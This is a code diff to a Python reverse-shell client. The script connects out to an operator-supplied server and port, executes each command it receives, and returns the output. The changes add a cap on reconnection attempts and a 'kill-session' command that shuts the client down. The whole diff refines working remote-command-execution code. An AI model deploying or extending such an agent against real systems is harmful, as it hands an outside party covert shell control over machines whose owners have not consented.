@@ -6,6 +6,7 @@ import argparse
 
 # Default reconnect delay
 RECONNECT_DELAY = 5
+MAX_RETRIES = 5  # Maximum number of reconnection attempts
 
 # Function to display usage information
 def usage():
@@ -34,13 +35,20 @@ def main():
     server = args.server
     port = args.port
 
-    while True:
+    retries = 0  # Count the number of reconnection attempts
+
+    while retries < MAX_RETRIES:
         # Create a TCP connection to the server
         try:
             sock = socket.create_connection((server, port))
             print(f"[+] Connected to {server}:{port}")
+            retries = 0  # Reset retries on successful connection
         except Exception as e:
-            print(f"[-] Connection failed: {e}")
+            retries += 1
+            print(f"[-] Connection failed ({retries}/{MAX_RETRIES}): {e}")
+            if retries >= MAX_RETRIES:
+                print("[-] Maximum retry limit reached. Exiting...")
+                sys.exit(1)
             time.sleep(RECONNECT_DELAY)
             continue
 
@@ -53,11 +61,12 @@ def main():
 
                 print(f"[*] Received command: {command}")
 
-                # If the 'die' command is received, exit
-                if command == "die":
+                # If the 'die' or 'kill-session' command is received, exit
+                if command.lower() == "die" or command.lower() == "kill-session":
                     print("[!] Received kill-session command. Shutting down...")
                     sock.send(b"EOF\n")
-                    break
+                    sock.close()  # Close the socket
+                    sys.exit(0)  # Exit the script
 
                 # Execute the command and capture the output
                 output = execute_command(command)
@@ -71,6 +80,12 @@ def main():
         # Close the connection if the loop exits
         print("[*] Connection closed")
         sock.close()
+
+        # Increment retry count and check the limit
+        retries += 1
+        if retries >= MAX_RETRIES:
+            print("[-] Maximum retry limit reached. Exiting...")
+            sys.exit(1)
 
         # Reconnect after the delay
         print(f"[*] Reconnecting in {RECONNECT_DELAY} seconds...")
